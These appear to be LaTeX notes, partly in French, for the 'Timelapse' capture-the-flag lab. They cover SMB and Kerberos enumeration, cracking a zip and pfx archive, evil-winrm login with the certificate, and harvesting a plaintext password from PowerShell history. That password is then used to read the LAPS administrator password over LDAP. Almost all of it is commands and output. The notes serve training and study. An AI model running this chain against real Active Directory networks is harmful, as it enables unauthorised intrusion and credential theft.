\chapter{Timelapse}
\begin{itemize}
    \item {\bf technics}: \gls{t:powershell-history}
    \item {\bf Components}: \gls{smb}, \gls{ldap}, \gls{laps}
    \item {\bf tools}:evil-winrm, ldapsearch, enum4linux-ng, pfx2john, john,
        winPEAS
\end{itemize}


\section{Résumé}


\section{Details}
\subsection{nmap}

\begin{verbatim}
sudo nmap -sV -sC 10.10.11.152
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-10 17:04 CEST
Nmap scan report for 10.10.11.152
Host is up (0.049s latency).
Not shown: 991 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
53/tcp  open  domain?
88/tcp  open  kerberos-sec?
135/tcp open  msrpc?
139/tcp open  netbios-ssn?
389/tcp open  ldap?
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  ldapssl?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
\end{verbatim}

\subsection{SMB enumeration}
\begin{verbatim}
enum4linux-ng -A 10.10.11.152 -u anonymous

[+] Long domain name is: timelapse.htb

 ===================================================
NetBIOS computer name: DC01
NetBIOS domain name: TIMELAPSE
DNS domain: timelapse.htb
FQDN: dc01.timelapse.htb
Derived membership: domain member
Derived domain: TIMELAPSE
===================================================
[+] Domain: TIMELAPSE
[+] Domain SID: S-1-5-21-671920749-559770252-3318990721
[+] Membership: domain member
===================================================
OS: Windows 10, Windows Server 2019, Windows Server 2016
OS version: '10.0'
OS release: '1809'
OS build: '17763'

===================================================
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share NETLOGON
[+] Mapping: OK, Listing: DENIED
[*] Testing share SYSVOL
[+] Mapping: OK, Listing: DENIED
[*] Testing share Shares
[+] Mapping: OK, Listing: OK

\end{verbatim}

en se connectant en anonymous on recupère des infos qui montrent que LAPS est
installé et que les mdp des admins locaux sont stockés dans des attributs

\begin{verbatim}
attribute added to may(contain attribute set of the computer class
ms-Mcs-AdmPwd - stores the password in clear text
\end{verbatim}

le zip \verb+winrm_backup.zip+ est crackable avec rockyou et contient un
\verb+pfx+

pareil pour le \verb+pfx+.




\subsection{User enum}

\begin{verbatim}
kerbrute userenum --dc 10.10.11.152 -d timelapse.htb \
    /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

2022/09/10 18:06:01 >  [+] VALID USERNAME:       guest@timelapse.htb
2022/09/10 18:06:10 >  [+] VALID USERNAME:       administrator@timelapse.htb
2022/09/10 18:07:26 >  [+] VALID USERNAME:       Guest@timelapse.htb
2022/09/10 18:07:27 >  [+] VALID USERNAME:       Administrator@timelapse.htb
^[2022/09/10 18:12:02 >  [+] VALID USERNAME:     GUEST@timelapse.htb
2022/09/10 18:26:20 >  [+] VALID USERNAME:       db01@timelapse.htb
2022/09/10 18:32:39 >  [+] VALID USERNAME:       trx@timelapse.htb
\end{verbatim}

\subsection{winrm}
\begin{verbatim}
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem

evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S


*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


upload winPEAS.bat
powershell -c ".\winPEAS.bat"

Checking PS history file
 Volume in drive C has no label.
 Volume Serial Number is 22CC-AE66

Directory of C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

03/04/2022  12:46 AM               434 ConsoleHost_history.txt
               1 File(s)            434 bytes
               0 Dir(s)   6,888,898,560 bytes free


*Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
\end{verbatim}
on chope le user flag avant de passer à ce nouveau user



\subsection{LAPS LDAPsearch}

\begin{verbatim}
ldapsearch -x -H ldap://dc01.timelapse.htb -D 'timelapse\svc_deploy' -w 'E3R$Q62^12p7PLlC%KWaxuaV'  -b "DC=TIMELAPSE,DC=HTB" |grep AdmPwd
ms-Mcs-AdmPwd: D4#Rq4-WWvd%MB91Xp#BEqcF
ms-Mcs-AdmPwdExpirationTime: 133077567297468469
\end{verbatim}

\begin{verbatim}
evil-winrm -i 10.10.11.152 -u Administrator -p 'D4#Rq4-WWvd%MB91Xp#BEqcF' -S
\end{verbatim}



\section{Theorie}

{\bf How does LAPS work?}
The core of the LAPS solution is a GPO client-side extension (CSE) that
performs the following tasks and can enforce the following actions during a GPO
update:
\begin{itemize}
\item  Checks whether the password of the local Administrator account has expired.
\item  Generates a new password when the old password is either expired or is required to be changed prior to expiration.
\item  Validates the new password against the password policy.
\item  Reports the password to Active Directory, storing it with a confidential attribute with the computer account in Active Directory.
\item  Reports the next expiration time for the password to Active Directory, storing it with an attribute with the computer account in Active Directory.
\item  Changes the password of the Administrator account.
\end{itemize}
The password then can be read from Active Directory \verb+ms-Mcs-AdmPwd+  by
users who are allowed to do so. Eligible users can request a password change
for a computer.

{\bf What are the features of LAPS?}
LAPS includes the following features:
\begin{itemize}
\item  Security that provides the ability to:
    \begin{itemize}
            \item Randomly generate passwords that are automatically changed on managed machines.
            \item Effectively mitigate PtH attacks that rely on identical local account passwords.
            \item Enforced password protection during transport via encryption using the Kerberos version 5 protocol.
            \item Use access control lists (ACLs) to protect passwords in Active Directory and easily implement a detailed security model.
    \end{itemize}
\item Manageability that provides the ability to:
\begin{itemize}
        \item Configure password parameters, including age, complexity, and length.
        \item Force password reset on a per-machine basis.
        \item Use a security model that is integrated with ACLs in Active Directory.
        \item Use any Active Directory management tool of choice; custom tools, such as Windows PowerShell, are provided.
        \item Protect against computer account deletion.
        \item Easily implement the solution with a minimal footprint.
    \end{itemize}
\end{itemize}


to retreive the plain text password :
\begin{verbatim}
Get-AdmPwdPassword –ComputerName <ComputerName>
\end{verbatim}
